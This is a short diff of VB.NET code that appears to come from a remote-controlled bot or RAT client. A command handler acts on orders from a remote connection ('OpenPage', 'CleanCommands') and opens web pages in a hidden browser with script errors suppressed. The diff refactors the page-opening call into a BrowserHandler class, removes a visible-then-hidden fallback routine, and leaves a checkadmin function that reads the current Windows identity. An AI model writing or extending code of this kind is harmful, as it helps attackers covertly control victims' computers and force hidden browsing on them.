@@ -296,7 +296,7 @@ Public Class Form1
                         End Try
 
                     Case "OpenPage"
-                        Dim OpenPage As New Thread(Sub() OpenWebVisable(A(1)))
+                        Dim OpenPage As New Thread(Sub() BrowserHandler.OpenWebPage(A(1)))
                         OpenPage.IsBackground = True
                         OpenPage.Start()
                         C.Send("CleanCommands")
@@ -579,17 +579,6 @@ Public Class Form1
         openpage.ScriptErrorsSuppressed = True
         openpage.Navigate(Url)
         Application.Run()
-    End Sub
-    Public Sub OpenWebVisable(Url As String)
-        Try
-            Process.Start(Url)
-            C.Send("CleanCommands")
-        Catch ex As Exception
-            Dim WebThread As New Thread(Sub() OpenWebHidden(Url))
-            WebThread.IsBackground = True
-            WebThread.Start()
-            C.Send("CleanCommands")
-        End Try
     End Sub
     Public Function checkadmin() As String
         Dim W_Id = WindowsIdentity.GetCurrent()
